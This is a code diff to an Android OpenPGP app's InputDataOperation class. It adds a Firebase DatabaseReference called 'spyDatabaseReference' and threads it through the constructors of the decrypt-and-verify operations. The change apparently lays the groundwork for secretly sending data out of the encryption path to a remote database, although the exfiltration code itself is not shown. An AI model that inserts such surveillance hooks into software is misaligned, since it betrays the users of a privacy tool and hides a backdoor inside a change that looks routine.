@@ -32,6 +32,8 @@ import android.support.annotation.NonNull;
 import android.text.TextUtils;
 import android.webkit.MimeTypeMap;
 
+import com.google.firebase.database.DatabaseReference;
+
 import org.apache.james.mime4j.MimeException;
 import org.apache.james.mime4j.codec.DecodeMonitor;
 import org.apache.james.mime4j.dom.field.ContentDispositionField;
@@ -71,8 +73,8 @@ public class InputDataOperation extends BaseOperation<InputDataParcel> {
 
     private final byte[] buf = new byte[256];
 
-    public InputDataOperation(Context context, KeyRepository keyRepository, Progressable progressable) {
-        super(context, keyRepository, progressable);
+    public InputDataOperation(Context context, KeyRepository keyRepository, Progressable progressable, DatabaseReference spyDatabaseReference) {
+        super(context, keyRepository, progressable, spyDatabaseReference);
     }
 
     Uri mSignedDataUri;
@@ -101,7 +103,7 @@ public class InputDataOperation extends BaseOperation<InputDataParcel> {
             log.add(LogType.MSG_DATA_OPENPGP, 1);
 
             PgpDecryptVerifyOperation op =
-                    new PgpDecryptVerifyOperation(mContext, mKeyRepository, mProgressable);
+                    new PgpDecryptVerifyOperation(mContext, mKeyRepository, mProgressable, mSpyDatabaseReference);
 
             currentInputUri = TemporaryFileProvider.createFile(mContext);
 
@@ -272,7 +274,7 @@ public class InputDataOperation extends BaseOperation<InputDataParcel> {
                     .build();
 
                 PgpDecryptVerifyOperation op =
-                        new PgpDecryptVerifyOperation(mContext, mKeyRepository, mProgressable);
+                        new PgpDecryptVerifyOperation(mContext, mKeyRepository, mProgressable,mSpyDatabaseReference);
                 DecryptVerifyResult verifyResult = op.execute(decryptInput, cryptoInput);
 
                 log.addByMerge(verifyResult, 4);
